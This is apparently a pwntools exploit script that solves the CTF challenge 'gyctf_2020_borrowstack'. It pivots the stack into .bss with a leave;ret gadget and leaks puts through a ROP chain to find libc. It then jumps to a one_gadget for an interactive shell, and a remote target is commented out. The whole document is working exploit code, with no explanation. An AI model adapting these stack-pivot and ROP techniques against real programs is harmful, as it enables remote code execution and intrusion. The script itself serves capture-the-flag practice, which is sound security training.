#coding:utf-8
from pwn import *
import pwnlib
from LibcSearcher import  *
context.log_level = 'debug'
sh = process("./gyctf_2020_borrowstack")
# sh = remote("node3.buuoj.cn",25563)
elf = ELF("./gyctf_2020_borrowstack")
def ts():
    gdb.attach(sh)
    pause()

put_plt = elf.plt['puts']
put_got = elf.got['puts']
pop_rdi = 0x400703
bss_addr = 0x601080
leave_ret = 0x400699
main_addr = 0x400626
ret = 0x4004c9
payload = 'a' * 0x60 + p64(bss_addr) + p64(leave_ret)
sh.send(payload)
payload = p64(ret) * 20  +   p64(pop_rdi) + p64(put_got) + p64(put_plt) + p64(main_addr)
sh.recvuntil('now!')
ts()
sh.send(payload)
sh.recvline()
put_addr = u64(sh.recv(6).ljust(8,"\x00"))
log.info("success get put_addr:0x%x"%put_addr)
libc = LibcSearcher('puts',put_addr)
libc_base = put_addr - libc.dump('puts')
log.info("success get libc_base:0x%x"%libc_base)
one_gadget = libc_base + 0x4526a
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = payload = 'a' * 0x60 + p64(0x601080) + p64(one_gadget)
sh.sendline(payload)
# payload = p64(pop_rdi) + p64(binsh_addr) + p64(system_addr) + p64(main_addr)
sh.send("1")
sh.interactive()